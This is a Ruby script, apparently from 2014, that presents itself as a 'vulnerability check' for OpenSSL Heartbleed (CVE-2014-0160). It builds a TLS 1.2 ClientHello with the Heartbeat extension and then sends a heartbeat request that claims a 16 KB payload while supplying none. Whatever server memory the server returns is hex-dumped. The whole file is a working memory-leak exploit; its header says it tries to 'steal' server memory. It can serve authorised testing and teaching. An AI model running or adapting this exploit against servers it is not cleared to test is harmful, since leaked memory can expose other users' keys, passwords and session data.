#!/usr/bin/ruby

# ******************************************************************************
# OpenSSL CVE-2014-0160 ("Heartbleed") vulnerability check over TLS 1.2
# ******************************************************************************
# This script will try to steal ~ 16Kib from the remote server memory and
# display data content if successful. It will send a ClientHello message with a
# very complete cipher suite list. The only TLS extension used is the Heartbeat
# extension.
# It expects one or two parameters from the command line : remote host and port.
# Port 443 is assumed if not specified.
# ******************************************************************************
# @author : Xavier LUCAS
# @date   : 08/04/2014
# ******************************************************************************

require 'Hexdump'
require 'socket'


# ------------------------------------------------------------------------------
#  Messages
# ------------------------------------------------------------------------------
# Structures of TLS records used in this script are detailed below and messages
# are divided into parts matching these explanations.
# See RFCs 5246 and 6520 for more details about expected content for each field.
# ------------------------------------------------------------------------------


# ==============================================================================
# TLS 1.2 - Record structure
# ==============================================================================
# B0      : Content type
# B1-2    : TLS version
# B3-4    : TLS protocol message length
# <next>  : Protocol message
# ==============================================================================

TLS_HANDSHAKE_HEADER = [
    0x16,
    0x03, 0x03,
    0x01, 0xD8
]

TLS_HEARTBEAT_HEADER = [
    0x18,
    0x03, 0x03,
    0x00, 0x03
]

# ==============================================================================
# TLS 1.2 - Handshake Protocol message structure
# ==============================================================================
# B0      : Message type
# B1-3    : Message length
# B4-5    : Protocol version
# B6-9    : Unix GMT time
# B10-37  : Random sequence
# B38     : Session ID length
# <next>  : Session ID (optional)
# <next>  : Cipher suites length
# <next > : Cipher suites
# <next>  : Compression methods length
# <next>  : Compression methods
# <next>  : Extensions length
# <next>  : Extensions (optional)
# ==============================================================================

TLS_HANDSHAKE_PROTOCOL = [
  0x01,
  0x00, 0x01, 0xD4,
  0x03, 0x03,
  0x53, 0x4A, 0x84, 0xA9,
  # Random sequence
    0x00, 0x01, 0x02, 0x03,   0x04, 0x05, 0x06, 0x07,   0x08, 0x09, 0x0A, 0x0B,
    0x0C, 0x0D, 0x0E, 0x0F,   0x10, 0x11, 0x12, 0x13,   0x14, 0x15, 0x16, 0x17,
    0x18, 0x19, 0x1A, 0x1B,
  # end
  0x00,
  0x01, 0xA6,
  # Cipher suites
    0x00, 0x00,     # TLS_NULL_WITH_NULL_NULL
    0x00, 0x01,     # TLS_RSA_WITH_NULL_MD5
    0x00, 0x02,     # TLS_RSA_WITH_NULL_SHA
    0x00, 0x03,     # TLS_RSA_EXPORT_WITH_RC4_40_MD5
    0x00, 0x04,     # TLS_RSA_WITH_RC4_128_MD5
    0x00, 0x05,     # TLS_RSA_WITH_RC4_128_SHA
    0x00, 0x06,     # TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5
    0x00, 0x07,     # TLS_RSA_WITH_IDEA_CBC_SHA
    0x00, 0x08,     # TLS_RSA_EXPORT_WITH_DES40_CBC_SHA
    0x00, 0x09,     # TLS_RSA_WITH_DES_CBC_SHA
    0x00, 0x0A,     # TLS_RSA_WITH_3DES_EDE_CBC_SHA
    0x00, 0x0B,     # TLS_DH_DSS_EXPORT_WITH_DES40_CBC_SHA
    0x00, 0x0C,     # TLS_DH_DSS_WITH_DES_CBC_SHA
    0x00, 0x0D,     # TLS_DH_DSS_WITH_3DES_EDE_CBC_SHA
    0x00, 0x0E,     # TLS_DH_RSA_EXPORT_WITH_DES40_CBC_SHA
    0x00, 0x0F,     # TLS_DH_RSA_WITH_DES_CBC_SHA
    0x00, 0x10,     # TLS_DH_RSA_WITH_3DES_EDE_CBC_SHA
    0x00, 0x11,     # TLS_DHE_DSS_EXPORT_WITH_DES40_CBC_SHA
    0x00, 0x12,     # TLS_DHE_DSS_WITH_DES_CBC_SHA
    0x00, 0x13,     # TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA
    0x00, 0x14,     # TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
    0x00, 0x15,     # TLS_DHE_RSA_WITH_DES_CBC_SHA
    0x00, 0x16,     # TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
    0x00, 0x17,     # TLS_DH_Anon_EXPORT_WITH_RC4_40_MD5
    0x00, 0x18,     # TLS_DH_Anon_WITH_RC4_128_MD5
    0x00, 0x19,     # TLS_DH_Anon_EXPORT_WITH_DES40_CBC_SHA
    0x00, 0x1A,     # TLS_DH_Anon_WITH_DES_CBC_SHA
    0x00, 0x1B,     # TLS_DH_Anon_WITH_3DES_EDE_CBC_SHA
    0x00, 0x1C,     # SSL_FORTEZZA_KEA_WITH_NULL_SHA
    0x00, 0x1D,     # SSL_FORTEZZA_KEA_WITH_FORTEZZA_CBC_SHA
    0x00, 0x1E,     # TLS_KRB5_WITH_DES_CBC_SHA
    0x00, 0x1F,     # TLS_KRB5_WITH_3DES_EDE_CBC_SHA
    0x00, 0x20,     # TLS_KRB5_WITH_RC4_128_SHA
    0x00, 0x21,     # TLS_KRB5_WITH_IDEA_CBC_SHA
    0x00, 0x22,     # TLS_KRB5_WITH_DES_CBC_MD5
    0x00, 0x23,     # TLS_KRB5_WITH_3DES_EDE_CBC_MD5
    0x00, 0x24,     # TLS_KRB5_WITH_RC4_128_MD5
    0x00, 0x25,     # TLS_KRB5_WITH_IDEA_CBC_MD5
    0x00, 0x26,     # TLS_KRB5_EXPORT_WITH_DES_CBC_40_SHA
    0x00, 0x27,     # TLS_KRB5_EXPORT_WITH_RC2_CBC_40_SHA
    0x00, 0x28,     # TLS_KRB5_EXPORT_WITH_RC4_40_SHA
    0x00, 0x29,     # TLS_KRB5_EXPORT_WITH_DES_CBC_40_MD5
    0x00, 0x2A,     # TLS_KRB5_EXPORT_WITH_RC2_CBC_40_MD5
    0x00, 0x2B,     # TLS_KRB5_EXPORT_WITH_RC4_40_MD5
    0x00, 0x2C,     # TLS_PSK_WITH_NULL_SHA
    0x00, 0x2D,     # TLS_DHE_PSK_WITH_NULL_SHA
    0x00, 0x2E,     # TLS_RSA_PSK_WITH_NULL_SHA
    0x00, 0x2F,     # TLS_RSA_WITH_AES_128_CBC_SHA
    0x00, 0x30,     # TLS_DH_DSS_WITH_AES_128_CBC_SHA
    0x00, 0x31,     # TLS_DH_RSA_WITH_AES_128_CBC_SHA
    0x00, 0x32,     # TLS_DHE_DSS_WITH_AES_128_CBC_SHA
    0x00, 0x33,     # TLS_DHE_RSA_WITH_AES_128_CBC_SHA
    0x00, 0x34,     # TLS_DH_Anon_WITH_AES_128_CBC_SHA
    0x00, 0x35,     # TLS_RSA_WITH_AES_256_CBC_SHA
    0x00, 0x36,     # TLS_DH_DSS_WITH_AES_256_CBC_SHA
    0x00, 0x37,     # TLS_DH_RSA_WITH_AES_256_CBC_SHA
    0x00, 0x38,     # TLS_DHE_DSS_WITH_AES_256_CBC_SHA
    0x00, 0x39,     # TLS_DHE_RSA_WITH_AES_256_CBC_SHA
    0x00, 0x3A,     # TLS_DH_Anon_WITH_AES_256_CBC_SHA
    0x00, 0x3B,     # TLS_RSA_WITH_NULL_SHA256
    0x00, 0x3C,     # TLS_RSA_WITH_AES_128_CBC_SHA256
    0x00, 0x3D,     # TLS_RSA_WITH_AES_256_CBC_SHA256
    0x00, 0x3E,     # TLS_DH_DSS_WITH_AES_128_CBC_SHA256
    0x00, 0x3F,     # TLS_DH_RSA_WITH_AES_128_CBC_SHA256
    0x00, 0x40,     # TLS_DHE_DSS_WITH_AES_128_CBC_SHA256
    0x00, 0x41,     # TLS_RSA_WITH_CAMELLIA_128_CBC_SHA
    0x00, 0x42,     # TLS_DH_DSS_WITH_CAMELLIA_128_CBC_SHA
    0x00, 0x43,     # TLS_DH_RSA_WITH_CAMELLIA_128_CBC_SHA
    0x00, 0x44,     # TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA
    0x00, 0x45,     # TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA
    0x00, 0x46,     # TLS_DH_Anon_WITH_CAMELLIA_128_CBC_SHA
    0x00, 0x47,     # TLS_ECDH_ECDSA_WITH_NULL_SHA
    0x00, 0x48,     # TLS_ECDH_ECDSA_WITH_RC4_128_SHA
    0x00, 0x49,     # TLS_ECDH_ECDSA_WITH_DES_CBC_SHA
    0x00, 0x4A,     # TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA
    0x00, 0x4B,     # TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA
    0x00, 0x4C,     # TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA
    0x00, 0x60,     # TLS_RSA_EXPORT1024_WITH_RC4_56_MD5
    0x00, 0x61,     # TLS_RSA_EXPORT1024_WITH_RC2_CBC_56_MD5
    0x00, 0x62,     # TLS_RSA_EXPORT1024_WITH_DES_CBC_SHA
    0x00, 0x63,     # TLS_DHE_DSS_EXPORT1024_WITH_DES_CBC_SHA
    0x00, 0x64,     # TLS_RSA_EXPORT1024_WITH_RC4_56_SHA
    0x00, 0x65,     # TLS_DHE_DSS_EXPORT1024_WITH_RC4_56_SHA
    0x00, 0x66,     # TLS_DHE_DSS_WITH_RC4_128_SHA
    0x00, 0x67,     # TLS_DHE_RSA_WITH_AES_128_CBC_SHA256
    0x00, 0x68,     # TLS_DH_DSS_WITH_AES_256_CBC_SHA256
    0x00, 0x69,     # TLS_DH_RSA_WITH_AES_256_CBC_SHA256
    0x00, 0x6A,     # TLS_DHE_DSS_WITH_AES_256_CBC_SHA256
    0x00, 0x6B,     # TLS_DHE_RSA_WITH_AES_256_CBC_SHA256
    0x00, 0x6C,     # TLS_DH_Anon_WITH_AES_128_CBC_SHA256
    0x00, 0x6D,     # TLS_DH_Anon_WITH_AES_256_CBC_SHA256
    0x00, 0x80,     # TLS_GOSTR341094_WITH_28147_CNT_IMIT
    0x00, 0x81,     # TLS_GOSTR341001_WITH_28147_CNT_IMIT
    0x00, 0x82,     # TLS_GOSTR341094_WITH_NULL_GOSTR3411
    0x00, 0x83,     # TLS_GOSTR341001_WITH_NULL_GOSTR3411
    0x00, 0x84,     # TLS_RSA_WITH_CAMELLIA_256_CBC_SHA
    0x00, 0x85,     # TLS_DH_DSS_WITH_CAMELLIA_256_CBC_SHA
    0x00, 0x86,     # TLS_DH_RSA_WITH_CAMELLIA_256_CBC_SHA
    0x00, 0x87,     # TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA
    0x00, 0x88,     # TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA
    0x00, 0x89,     # TLS_DH_Anon_WITH_CAMELLIA_256_CBC_SHA
    0x00, 0x8A,     # TLS_PSK_WITH_RC4_128_SHA
    0x00, 0x8B,     # TLS_PSK_WITH_3DES_EDE_CBC_SHA
    0x00, 0x8C,     # TLS_PSK_WITH_AES_128_CBC_SHA
    0x00, 0x8D,     # TLS_PSK_WITH_AES_256_CBC_SHA
    0x00, 0x8E,     # TLS_DHE_PSK_WITH_RC4_128_SHA
    0x00, 0x8F,     # TLS_DHE_PSK_WITH_3DES_EDE_CBC_SHA
    0x00, 0x90,     # TLS_DHE_PSK_WITH_AES_128_CBC_SHA
    0x00, 0x91,     # TLS_DHE_PSK_WITH_AES_256_CBC_SHA
    0x00, 0x92,     # TLS_RSA_PSK_WITH_RC4_128_SHA
    0x00, 0x93,     # TLS_RSA_PSK_WITH_3DES_EDE_CBC_SHA
    0x00, 0x94,     # TLS_RSA_PSK_WITH_AES_128_CBC_SHA
    0x00, 0x95,     # TLS_RSA_PSK_WITH_AES_256_CBC_SHA
    0x00, 0x96,     # TLS_RSA_WITH_SEED_CBC_SHA
    0x00, 0x97,     # TLS_DH_DSS_WITH_SEED_CBC_SHA
    0x00, 0x98,     # TLS_DH_RSA_WITH_SEED_CBC_SHA
    0x00, 0x99,     # TLS_DHE_DSS_WITH_SEED_CBC_SHA
    0x00, 0x9A,     # TLS_DHE_RSA_WITH_SEED_CBC_SHA
    0x00, 0x9B,     # TLS_DH_Anon_WITH_SEED_CBC_SHA
    0x00, 0x9C,     # TLS_RSA_WITH_AES_128_GCM_SHA256
    0x00, 0x9D,     # TLS_RSA_WITH_AES_256_GCM_SHA384
    0x00, 0x9E,     # TLS_DHE_RSA_WITH_AES_128_GCM_SHA256
    0x00, 0x9F,     # TLS_DHE_RSA_WITH_AES_256_GCM_SHA384
    0x00, 0xA0,     # TLS_DH_RSA_WITH_AES_128_GCM_SHA256
    0x00, 0xA1,     # TLS_DH_RSA_WITH_AES_256_GCM_SHA384
    0x00, 0xA2,     # TLS_DHE_DSS_WITH_AES_128_GCM_SHA256
    0x00, 0xA3,     # TLS_DHE_DSS_WITH_AES_256_GCM_SHA384
    0x00, 0xA4,     # TLS_DH_DSS_WITH_AES_128_GCM_SHA256
    0x00, 0xA5,     # TLS_DH_DSS_WITH_AES_256_GCM_SHA384
    0x00, 0xA6,     # TLS_DH_Anon_WITH_AES_128_GCM_SHA256
    0x00, 0xA7,     # TLS_DH_Anon_WITH_AES_256_GCM_SHA384
    0x00, 0xA8,     # TLS_PSK_WITH_AES_128_GCM_SHA256
    0x00, 0xA9,     # TLS_PSK_WITH_AES_256_GCM_SHA384
    0x00, 0xAA,     # TLS_DHE_PSK_WITH_AES_128_GCM_SHA256
    0x00, 0xAB,     # TLS_DHE_PSK_WITH_AES_256_GCM_SHA384
    0x00, 0xAC,     # TLS_RSA_PSK_WITH_AES_128_GCM_SHA256
    0x00, 0xAD,     # TLS_RSA_PSK_WITH_AES_256_GCM_SHA384
    0x00, 0xAE,     # TLS_PSK_WITH_AES_128_CBC_SHA256
    0x00, 0xAF,     # TLS_PSK_WITH_AES_256_CBC_SHA384
    0x00, 0xB0,     # TLS_PSK_WITH_NULL_SHA256
    0x00, 0xB1,     # TLS_PSK_WITH_NULL_SHA384
    0x00, 0xB2,     # TLS_DHE_PSK_WITH_AES_128_CBC_SHA256
    0x00, 0xB3,     # TLS_DHE_PSK_WITH_AES_256_CBC_SHA384
    0x00, 0xB4,     # TLS_DHE_PSK_WITH_NULL_SHA256
    0x00, 0xB5,     # TLS_DHE_PSK_WITH_NULL_SHA384
    0x00, 0xB6,     # TLS_RSA_PSK_WITH_AES_128_CBC_SHA256
    0x00, 0xB7,     # TLS_RSA_PSK_WITH_AES_256_CBC_SHA384
    0x00, 0xB8,     # TLS_RSA_PSK_WITH_NULL_SHA256
    0x00, 0xB9,     # TLS_RSA_PSK_WITH_NULL_SHA384
    0xC0, 0x01,     # TLS_ECDH_ECDSA_WITH_NULL_SHA
    0xC0, 0x02,     # TLS_ECDH_ECDSA_WITH_RC4_128_SHA
    0xC0, 0x03,     # TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA
    0xC0, 0x04,     # TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA
    0xC0, 0x05,     # TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA
    0xC0, 0x06,     # TLS_ECDHE_ECDSA_WITH_NULL_SHA
    0xC0, 0x07,     # TLS_ECDHE_ECDSA_WITH_RC4_128_SHA
    0xC0, 0x08,     # TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA
    0xC0, 0x09,     # TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA
    0xC0, 0x0A,     # TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA
    0xC0, 0x0B,     # TLS_ECDH_RSA_WITH_NULL_SHA
    0xC0, 0x0C,     # TLS_ECDH_RSA_WITH_RC4_128_SHA
    0xC0, 0x0D,     # TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA
    0xC0, 0x0E,     # TLS_ECDH_RSA_WITH_AES_128_CBC_SHA
    0xC0, 0x0F,     # TLS_ECDH_RSA_WITH_AES_256_CBC_SHA
    0xC0, 0x10,     # TLS_ECDHE_RSA_WITH_NULL_SHA
    0xC0, 0x11,     # TLS_ECDHE_RSA_WITH_RC4_128_SHA
    0xC0, 0x12,     # TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA
    0xC0, 0x13,     # TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA
    0xC0, 0x14,     # TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA
    0xC0, 0x15,     # TLS_ECDH_Anon_WITH_NULL_SHA
    0xC0, 0x16,     # TLS_ECDH_Anon_WITH_RC4_128_SHA
    0xC0, 0x17,     # TLS_ECDH_Anon_WITH_3DES_EDE_CBC_SHA
    0xC0, 0x18,     # TLS_ECDH_Anon_WITH_AES_128_CBC_SHA
    0xC0, 0x19,     # TLS_ECDH_Anon_WITH_AES_256_CBC_SHA
    0xC0, 0x1A,     # TLS_SRP_SHA_WITH_3DES_EDE_CBC_SHA
    0xC0, 0x1B,     # TLS_SRP_SHA_RSA_WITH_3DES_EDE_CBC_SHA
    0xC0, 0x1C,     # TLS_SRP_SHA_DSS_WITH_3DES_EDE_CBC_SHA
    0xC0, 0x1D,     # TLS_SRP_SHA_WITH_AES_128_CBC_SHA
    0xC0, 0x1E,     # TLS_SRP_SHA_RSA_WITH_AES_128_CBC_SHA
    0xC0, 0x1F,     # TLS_SRP_SHA_DSS_WITH_AES_128_CBC_SHA
    0xC0, 0x20,     # TLS_SRP_SHA_WITH_AES_256_CBC_SHA
    0xC0, 0x21,     # TLS_SRP_SHA_RSA_WITH_AES_256_CBC_SHA
    0xC0, 0x22,     # TLS_SRP_SHA_DSS_WITH_AES_256_CBC_SHA
    0xC0, 0x23,     # TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256
    0xC0, 0x24,     # TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384
    0xC0, 0x25,     # TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA256
    0xC0, 0x26,     # TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA384
    0xC0, 0x27,     # TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256
    0xC0, 0x28,     # TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384
    0xC0, 0x29,     # TLS_ECDH_RSA_WITH_AES_128_CBC_SHA256
    0xC0, 0x2A,     # TLS_ECDH_RSA_WITH_AES_256_CBC_SHA384
    0xC0, 0x2B,     # TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256
    0xC0, 0x2C,     # TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384
    0xC0, 0x2D,     # TLS_ECDH_ECDSA_WITH_AES_128_GCM_SHA256
    0xC0, 0x2E,     # TLS_ECDH_ECDSA_WITH_AES_256_GCM_SHA384
    0xC0, 0x2F,     # TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
    0xC0, 0x30,     # TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
    0xC0, 0x31,     # TLS_ECDH_RSA_WITH_AES_128_GCM_SHA256
    0xC0, 0x32,     # TLS_ECDH_RSA_WITH_AES_256_GCM_SHA384
    0xC0, 0x33,     # TLS_ECDHE_PSK_WITH_RC4_128_SHA
    0xC0, 0x34,     # TLS_ECDHE_PSK_WITH_3DES_EDE_CBC_SHA
    0xC0, 0x35,     # TLS_ECDHE_PSK_WITH_AES_128_CBC_SHA
    0xC0, 0x36,     # TLS_ECDHE_PSK_WITH_AES_256_CBC_SHA
    0xC0, 0x37,     # TLS_ECDHE_PSK_WITH_AES_128_CBC_SHA256
    0xC0, 0x38,     # TLS_ECDHE_PSK_WITH_AES_256_CBC_SHA384
    0xC0, 0x39,     # TLS_ECDHE_PSK_WITH_NULL_SHA
    0xC0, 0x3A,     # TLS_ECDHE_PSK_WITH_NULL_SHA256
    0xC0, 0x3B,     # TLS_ECDHE_PSK_WITH_NULL_SHA384
    0xFE, 0xFE,     # SSL_RSA_FIPS_WITH_DES_CBC_SHA
    0xFE, 0xFF,     # SSL_RSA_FIPS_WITH_3DES_EDE_CBC_SHA
    0xFF, 0xE0,     # SSL_RSA_FIPS_WITH_3DES_EDE_CBC_SHA
  # end
  0x01,
  0x00,
  0x00, 0x05,
  # Extensions
    0x00, 0x0F, 0x00, 0x01, 0x01  # Heartbeat
  # end
]

# ==============================================================================
# TLS 1.2 - HeartBeat Protocol message structure
# ==============================================================================
# B0      : Message type
# B1-2    : Payload length
# <next>  : Payload (deliberately omitted here)
# <next>  : Padding (deliberately omitted here)
# ==============================================================================

TLS_HEARTBEAT_PROTOCOL = [
  0x01,
  0x3F, 0xFD
]

# Assemble header and protocol data
TLS_HANDSHAKE = TLS_HANDSHAKE_HEADER.concat(TLS_HANDSHAKE_PROTOCOL).pack('C*')
TLS_HEARTBEAT = TLS_HEARTBEAT_HEADER.concat(TLS_HEARTBEAT_PROTOCOL).pack('C*')


# ------------------------------------------------------------------------------
# Connection handling
# ------------------------------------------------------------------------------

# Read TLS record header type
def read_tls_header_type (socket)
  header = socket.read(5)
  h_type, h_maj_version, h_min_version, h_length = header.unpack('CCCn')
  return h_type
end

# Read handshake type and silently discard protocol data
def read_tls_handshake_type (socket)
  handshake = socket.read(4)
  hs_type, hs_length = handshake.unpack('CH6')
  hs_length = hs_length.to_i(16)
  hs_data = socket.read(hs_length)
  return hs_type
end

# Read heartbeat data
def read_tls_heartbeat_data (socket)
  heartbeat = socket.read(3)
  ht_type, ht_length = heartbeat.unpack('Cn')
  ht_data = socket.read(ht_length)
  return ht_data
end

# Do the vulnerability test
def check(host, port = 443)
  # Connect
  s = TCPSocket.new(host, port)

  # Send ClientHello message
  s.write(TLS_HANDSHAKE)

  # Foolishly wait for ServerHelloDone message
  loop until read_tls_header_type(s) == 22 and read_tls_handshake_type(s) == 14

  # Send Heartbeat Request message
  s.write(TLS_HEARTBEAT)

  # Read Heartbeat Response message if any
  if read_tls_header_type(s) == 24
    data = read_tls_heartbeat_data(s)
    if !data.nil? and data.size > 3
      puts "Host #{host}:#{port} is vulnerable! Heartbeat response payload :"
      puts Hexdump.dump(data)
    else
      puts "Host #{host}:#{port} is safe"
    end
  else
    puts "Host #{host}:#{port} seems safe"
  end

  # Disconnect
  s.close()
end


# ------------------------------------------------------------------------------
# Run
# ------------------------------------------------------------------------------

if ARGV[1].nil?
  check(ARGV[0])
else
  check(ARGV[0], ARGV[1])
end
